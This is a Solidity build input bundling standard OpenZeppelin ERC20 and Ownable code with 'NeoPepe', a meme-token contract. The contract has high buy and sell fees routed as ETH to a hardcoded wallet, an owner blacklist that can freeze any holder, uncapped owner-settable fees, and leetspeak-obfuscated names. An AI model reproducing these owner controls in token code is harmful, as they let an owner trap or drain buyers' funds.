{{
  "language": "Solidity",
  "sources": {
    "lib/openzeppelin-contracts/contracts/access/Ownable.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../utils/Context.sol\";\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner() internal view virtual {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n"
    },
    "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\nimport \"./extensions/IERC20Metadata.sol\";\nimport \"../../utils/Context.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * The default value of {decimals} is 18. To select a different value for\n     * {decimals} you should overload it.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\n     * overridden;\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves `amount` of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     */\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\n            // decrementing then incrementing.\n            _balances[to] += amount;\n        }\n\n        emit Transfer(from, to, amount);\n\n        _afterTokenTransfer(from, to, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        unchecked {\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\n            _balances[account] += amount;\n        }\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n            // Overflow not possible: amount <= accountBalance <= totalSupply.\n            _totalSupply -= amount;\n        }\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n     *\n     * Does not update the allowance amount in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Might emit an {Approval} event.\n     */\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * has been transferred to `to`.\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n}\n"
    },
    "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n"
    },
    "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../IERC20.sol\";\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n *\n * _Available since v4.1._\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n"
    },
    "lib/openzeppelin-contracts/contracts/utils/Context.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n"
    },
    "src/NeoPepe.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.17;\n\n//                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 +*=========*\n//                                    ****=====%%%@@@@@@@%%\n//                                ****=====%%%@@@@@@#######@@%            .:******:\n//                             *****====%%%%@@@@@############@@=     .**===%%%%@@@@@@%%\n//                          .*****====%%%@@@@@@@###############@%  +*===%%%%@@@@@@######@\n//                         +*****=====%%%%@@@@@@@@@@@@@########@@%*====%%%%@@@@###########@\n//                       -******=======%%%%%@%%=**======%%%%%%%=%@====%%%%@@@@#############@:\n//                      +********=======%%%=*=======%%%%@@@@@@@@@@%%==%%%%@@@@##############@-\n//                    -*********=========+**====%%@@@@@@@@@@@######@@@%%%%@@@#####@***==%%%%%%%%%\n//                   **********========+***=%%%%%%%%@@@@@@@@@@@@@@@@@@@@%%%@@##***==%%%%@@@@@####@@@%\n//                 +*********=======*+***====%%%%%%%@@@@@@@@@@@@@@@@@@@@@%%@@***==%%%%@@@@#########@@@@\n//               -**********======**+*========%%%%%%%@@@@############@@@@@%=***====%%%@@@@@@@@######@@@@=\n//              ******=*****====***+*=========%%%%@@##@@@@@@@@@@@@@@@@@@@@#@%=====%%%%%%@@@@@@######@@@@@@.\n//            +****====**************========%%@@@@%@@@@@@@@@@@@@@@@@@@@@@@%%%====%%%%%%%@@#########@@@@@@@@\n//          .****======********++******====%%%%%%%%%%%%%%@@@#############@@%%%====%%%%%%@@@@@@@@@@@@@@@@@%%%:\n//         +****=======*******+*********========%%%@@####################@@%%======%%%%%@@@@@@###########%==\n//        +****========*****++++*********====%%@@@@@@@##################@@@%==*=====%%%%%@@@#############@%.\n//       *****=========****+++++++++---++*====%%%%%%%%%%@@@@@############@@%=***===%%%%@@@@@@############@=\n//     ++****===========****+++++++++----++*====%%%%%=--:  .*@%*-######@@% .*=*===%%%%@@@@=@@%*-#####=   +\n//    ++****============*****+++++++***=%%+=====%%@@@*@#########@*@####@@%=:%%%%%%%%%=@@#######@=-####@@\n//   .+*****=============*************====%%%===%%@@@############@*#####@%=+#@@@@@+%%@########@#@=#####@*\n//   ++*****=================********++*===%%%@@@%%@*############@=#####@%=@@###===%%%###########%@###@%*=\n//  ++*******=====================****+++++=%%%@@@@##@###########@=###@@%%==@#####@%==@#########@=###@@%*=\n// :++********=========================**++---++%@@@@@@@########@=##@@@%%+%%%@@#@##@@@@@#######%%%@@%=@#@\n// +++*********==========================%%=*++++++++=@@@@#################@%%@@@#@@#@@################@\n// +++***********=====================%%%%%@@@@%===*++******=%%@#######@@@@@@%@@@@###@@############@%=*\n// -+++************============%%%%%%%%%%%%@@@@@@###@@%%========%%%%@@@@@####@@@@@@##################@@%\n// ++++***************==========%%%%%%%%%%@@@@@@################################@@@##################@@%\n// +-+++*****************=========%%%=%%%%@@@@@#######################################################@%%\n// :-++++***************=*==========%%%%%%@@@@@#######################################################@@%%\n//  --+++++********************===%%%%%%%%@@@@@########################################################@@%%\n//   --++++++*************************%%%%%@@@@@########################################################@@%\n//    ---++++++++*************++***++++++*%%@@@@@@#######################################################@@\n//     ---++++++++++++****************+++++---=@@@@######################################################@.\n//      ----++++++++++******==*=*-*=====%@:---+----*@###################################################=\n//       :-----+++++++++*****====*+-*%%%%%%%%#---++++++++*%@#######################################@=*+\n//         -:----++++++++*****====*+-:+=%%%%%%%%%@#:-++++++++****===%@##################@@%====***++%%+\n//          .::-----+++++++******===*++-:*%%%@@@@@@@@@@#--+++++*******************************++#@@@@%\n//             ::-----++++++++**********+-::-=%%@@@@@@@@@@@@@@##--++++++++**************+#######@#@@@\n//              :::-----+++++++*******====*++-::+=%@@@@@@@@@######################################@@*%\n//                .:::----+++++++*******=======+--:.-=%%@@@@####################################@==%####\n//                   :::----+++++++********========*+--:.:*=%@@##############################%+=%@######@\n//                     ::::----++++++********===============**-::..-+=%@@############@=***+.*=@@#####@@@@@#%\n//                        ::::-----+++++*********=====================****************+++-=%@######%-+%@@@**=%@+\n//                           :.:::---++++++****************************************+++-*%@#######@++**=+=%%%%@##%\n//                              ...:::---++++++*******************************++*%@@@*%@#######=+***+==@########@%%\n//                                  ....:::-----+++++++++++++++++++++++++++--:   -@##=@####@%%*+*+*=%%@@#@%==-++=%@#@\n//                                         ...::::::-------------:::::.             .-*=%%%##%*+==%@@@@=**===%@######\n//                                                                                  -:+*==@###+=%@@@%*+*===%%@###%@+*=\n//                                                                                   .:+=%@###@-*%==+*====%%@@*+**=%@##=\n//                                                                                     .:+*=%@@%%%%@+*===%%*+*=%%@#####@\n//                                                                                         .-+***====-+==+**==%%@@@@##%\n//                                                                                             ..:-++++*****=%@@%%=+*%%\n//                                                                                                  ..:::--*::+---+=%@%\n//                                                                                                        ...:-+****%@@\n\n// https://neopepe.com/\n// https://twitter.com/neopepecoin\n// https://t.me/neopepecoin\n\nimport \"openzeppelin/token/ERC20/ERC20.sol\";\nimport \"openzeppelin/access/Ownable.sol\";\n\ninterface IUniswapV2Router02 {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ninterface IUniswapV2Factory {\n    function createPair(\n        address tokenA,\n        address tokenB\n    ) external returns (address pair);\n}\n\ncontract NeoPepe is ERC20, Ownable {\n    error Errn0b075();\n    error Err700m4ny();\n\n    uint256 public constant m4x_5upply = 420_000_000_000 ether;\n    address constant l33t = 0x9945ef90cC327b0eD4aDa00fE301f68C7849D43e;\n    IUniswapV2Router02 public constant un15w4p_v2_r0u73r =\n        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    uint256 private constant in1714l_buy_f33 = 20;\n    uint256 private constant in1714l_53ll_f33 = 50;\n\n    address public immutable un15w4p_v2_p41r;\n\n    mapping(address => bool) b075;\n    bool public l1m173d = true;\n    uint256 m4x = 8_400_000_000 ether;\n\n    uint256 public buyf33;\n    uint256 public s3llf33;\n\n    uint256 public sw4p70k3n5474m0un7;\n    bool private _155w4pp1n6;\n\n    mapping(address => bool) public i53xclud3dfr0mf335;\n\n    constructor() ERC20(\"NeoPepe\", \"NEOP\") {\n        address _un15w4pp41r = IUniswapV2Factory(un15w4p_v2_r0u73r.factory())\n            .createPair(address(this), un15w4p_v2_r0u73r.WETH());\n        un15w4p_v2_p41r = _un15w4pp41r;\n        sw4p70k3n5474m0un7 = m4x_5upply / 1000; // 0.1% swap wallet\n        buyf33 = in1714l_buy_f33;\n        s3llf33 = in1714l_53ll_f33;\n        exclud3fr0mf335(tx.origin, true);\n        exclud3fr0mf335(address(this), true);\n        _mint(tx.origin, m4x_5upply);\n        _transferOwnership(tx.origin);\n    }\n\n    function d357r0y(uint256 amount_) external {\n        _burn(msg.sender, amount_);\n    }\n\n    function exclud3fr0mf335(address a_, bool e_) public onlyOwner {\n        i53xclud3dfr0mf335[a_] = e_;\n    }\n\n    function s37b07(address b_, bool t_) external onlyOwner {\n        b075[b_] = t_;\n    }\n\n    function s37l1m173d(bool l_, uint256 m_) external onlyOwner {\n        l1m173d = l_;\n        m4x = m_;\n    }\n\n    function s37f335(uint256 b_, uint256 s_) external onlyOwner {\n        buyf33 = b_;\n        s3llf33 = s_;\n    }\n\n    function s375w4p70k3n5474m0un7(uint256 n_) external onlyOwner {\n        sw4p70k3n5474m0un7 = n_;\n    }\n\n    function c0ll3c757uck() external onlyOwner {\n        _transfer(address(this), msg.sender, balanceOf(address(this)));\n    }\n\n    function _beforeTokenTransfer(\n        address or161n,\n        address d3571n4710n,\n        uint256 am0un7\n    ) internal virtual override {\n        if (b075[or161n] || b075[d3571n4710n]) {\n            revert Errn0b075();\n        }\n\n        if (\n            l1m173d &&\n            or161n == un15w4p_v2_p41r &&\n            super.balanceOf(d3571n4710n) + am0un7 > m4x\n        ) {\n            revert Err700m4ny();\n        }\n    }\n\n    function _transfer(address f_, address t_, uint256 a_) internal override {\n        if (\n            balanceOf(address(this)) >= sw4p70k3n5474m0un7 &&\n            !_155w4pp1n6 &&\n            !i53xclud3dfr0mf335[f_] &&\n            !i53xclud3dfr0mf335[t_]\n        ) {\n            _155w4pp1n6 = true;\n            _5w4p();\n            _155w4pp1n6 = false;\n        }\n\n        uint256 _f33 = 0;\n        if (\n            !_155w4pp1n6 && !i53xclud3dfr0mf335[f_] && !i53xclud3dfr0mf335[t_]\n        ) {\n            uint256 s3ll7074lf335 = s3llf33;\n            uint256 buy7074lf335 = buyf33;\n\n            if (t_ == un15w4p_v2_p41r && s3ll7074lf335 > 0) {\n                _f33 = (a_ * s3ll7074lf335) / 100;\n                super._transfer(f_, address(this), _f33);\n            } else if (f_ == un15w4p_v2_p41r && buy7074lf335 > 0) {\n                _f33 = (a_ * buy7074lf335) / 100;\n                super._transfer(f_, address(this), _f33);\n            }\n        }\n\n        super._transfer(f_, t_, a_ - _f33);\n    }\n\n    function _5w4p() private {\n        uint256 c0n7r4c7b4l4nc3 = balanceOf(address(this));\n\n        if (c0n7r4c7b4l4nc3 == 0) {\n            return;\n        }\n\n        uint256 sw4p4m0un7 = c0n7r4c7b4l4nc3;\n        if (sw4p4m0un7 > sw4p70k3n5474m0un7 * 20) {\n            sw4p4m0un7 = sw4p70k3n5474m0un7 * 20;\n        }\n\n        _5w4p70k3n5f0r37h(sw4p4m0un7);\n\n        payable(address(l33t)).transfer(address(this).balance);\n    }\n\n    function _5w4p70k3n5f0r37h(uint256 t_) private {\n        address[] memory p4th = new address[](2);\n        p4th[0] = address(this);\n        p4th[1] = un15w4p_v2_r0u73r.WETH();\n\n        _approve(address(this), address(un15w4p_v2_r0u73r), t_);\n\n        un15w4p_v2_r0u73r.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            t_,\n            0,\n            p4th,\n            address(this),\n            block.timestamp\n        );\n    }\n}\n"
    }
  },
  "settings": {
    "remappings": [
      "ds-test/=lib/forge-std/lib/ds-test/src/",
      "forge-std/=lib/forge-std/src/",
      "openzeppelin-contracts/=lib/openzeppelin-contracts/",
      "openzeppelin/=lib/openzeppelin-contracts/contracts/"
    ],
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "metadata": {
      "bytecodeHash": "ipfs"
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "evmVersion": "london",
    "libraries": {}
  }
}}